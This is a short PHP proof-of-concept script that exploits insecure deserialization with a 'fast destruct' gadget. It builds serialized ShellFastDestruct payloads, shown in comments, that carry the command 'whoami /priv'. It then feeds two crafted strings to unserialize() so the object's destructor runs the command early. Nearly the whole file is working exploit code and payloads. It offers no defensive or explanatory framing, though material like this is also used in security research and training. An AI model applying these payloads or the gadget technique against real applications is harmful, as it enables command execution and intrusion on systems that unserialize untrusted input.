<?php

include 'shellFastDestruct.php';


# Create malicious object
// $shellObj = new ShellFastDestruct("whoami /priv");

// echo serialize($shellObj);

// serialized string = C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}


// Attempt 1: Target array inside of ShellFastDestruct class
// Payload: C:17:"ShellFastDestruct":94:{a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:0;s:12:"whoami /priv";}}

echo "Unserializing ..." . "\n";
$unserializedStr = unserialize('C:17:"ShellFastDestruct":94:{a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:0;s:12:"whoami /priv";}}');

// Attempt 2: Put the object inside of an array and cause the deserialization of the array
// Payload: a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:0;i:1;}
$unserializedStr = unserialize('a:2:{i:0;C:17:"ShellFastDestruct":30:{a:1:{i:0;s:12:"whoami /priv";}}i:0;i:1;}');

echo "Exiting" . "\n";

?>